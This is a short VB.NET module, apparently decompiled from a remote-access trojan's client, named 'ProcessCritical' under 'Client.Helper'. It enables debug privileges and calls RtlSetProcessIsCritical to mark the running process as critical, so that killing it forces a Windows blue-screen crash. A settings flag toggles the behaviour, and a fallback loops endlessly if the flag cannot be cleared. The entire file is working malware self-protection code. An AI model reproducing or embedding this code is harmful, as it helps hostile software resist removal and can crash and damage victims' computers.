Imports System
Imports System.Diagnostics
Imports System.Threading
Imports Microsoft.Win32

Namespace Client.Helper
	' Token: 0x02000018 RID: 24
	Public Module ProcessCritical
		' Token: 0x06000064 RID: 100 RVA: 0x00002318 File Offset: 0x00000518
		Public Sub SystemEvents_SessionEnding(sender As Object, e As SessionEndingEventArgs)
			If Convert.ToBoolean(Settings.BS_OD) AndAlso Methods.IsAdmin() Then
				ProcessCritical.[Exit]()
			End If
		End Sub

		' Token: 0x06000065 RID: 101 RVA: 0x00004354 File Offset: 0x00002554
		Public Sub [Set]()
			Try
				AddHandler SystemEvents.SessionEnding, AddressOf ProcessCritical.SystemEvents_SessionEnding
				Process.EnterDebugMode()
				NativeMethods.RtlSetProcessIsCritical(1UI, 0UI, 0UI)
			Catch
			End Try
		End Sub

		' Token: 0x06000066 RID: 102 RVA: 0x0000439C File Offset: 0x0000259C
		Public Sub [Exit]()
			Try
				NativeMethods.RtlSetProcessIsCritical(0UI, 0UI, 0UI)
			Catch
				While True
					Thread.Sleep(100000)
				End While
			End Try
		End Sub
	End Module
End Namespace
